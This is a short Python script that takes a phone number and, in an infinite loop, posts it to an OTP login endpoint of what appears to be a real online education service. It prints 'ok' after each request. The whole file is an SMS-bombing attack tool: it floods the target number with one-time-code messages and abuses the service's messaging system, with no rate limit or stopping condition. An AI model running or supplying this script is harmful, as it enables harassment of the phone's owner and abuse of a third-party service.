import requests
from termcolor import colored

url = 'https://l3.classino.com/user/auth/otp/login'

phonen = input('phone number: ')

pnd = {'cellphone': f'{phonen}'}

while True:

      req = requests.post(url, json= pnd)

      print(colored('ok', 'green'))

